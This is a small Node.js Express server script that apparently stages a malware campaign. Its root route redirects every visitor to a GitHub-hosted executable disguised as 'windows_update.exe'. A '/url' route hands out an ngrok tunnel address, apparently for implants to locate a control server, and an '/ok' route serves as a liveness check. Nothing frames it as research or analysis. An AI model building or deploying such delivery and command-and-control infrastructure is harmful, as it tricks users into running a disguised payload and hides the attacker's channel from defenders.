const express = require('express');
const app = express();
const PORT = process.env.PORT || 4500;

app.use(express.static('download'));

app.all('/ok', (req, res) => {
    const date = new Date();
    const day = `${date.getDate()}/${date.getMonth() + 1}/${date.getFullYear()}`
    const time = `${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`
    res.send(`OK! ${day} ${time}`)
})

app.all('/', (req, res) => {
    res.redirect('https://github.com/rserver98/backoffice/raw/main/windows_update.exe');
})

app.all('/url', (req, res) => {
    res.send('https://1516-190-192-75-210.sa.ngrok.io')
});

app.listen(PORT)
console.log(`Servidor listen on http://localhost:${PORT}`)
